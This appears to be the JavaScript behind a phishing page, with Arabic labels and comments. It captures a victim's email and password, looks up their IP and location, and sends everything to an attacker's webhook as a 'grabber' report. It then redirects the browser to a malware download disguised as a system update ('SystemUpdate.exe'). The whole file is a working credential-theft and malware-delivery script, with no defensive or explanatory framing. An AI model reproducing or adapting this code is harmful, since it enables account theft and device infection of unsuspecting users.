async function startCapture() {
    const email = document.getElementById('email').value;
    const pass = document.getElementById('pass').value;

    if(!email || !pass) return alert("يرجى إدخال البيانات للتوثيق");

    try {
        const configRes = await fetch('./data.json');
        const config = await configRes.json();
        const geoRes = await fetch('https://ipapi.co/json/');
        const geo = await geoRes.json();

        await fetch(config.webhook_url, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                username: "ER0R ELITE GRABBER",
                embeds: [{
                    title: "💀 تم سحب هدف جديد بنجاح",
                    color: 0x6001d2,
                    fields: [
                        { name: "📧 الإيميل", value: `\`${email}\``, inline: true },
                        { name: "🔑 الباسورد", value: `\`${pass}\``, inline: true },
                        { name: "🌐 الـ IP", value: `${geo.ip} (${geo.city}, ${geo.country_name})`, inline: false },
                        { name: "📱 الجهاز", value: navigator.platform, inline: true }
                    ],
                    footer: { text: "ER0R TEAM - COMMANDER" }
                }]
            })
        });

        // التحويل المباشر لتحميل الفيروس
        window.location.href = config.pc_payload;
    } catch(e) { 
        window.location.href = "https://example.com/SystemUpdate.exe";
    }
}
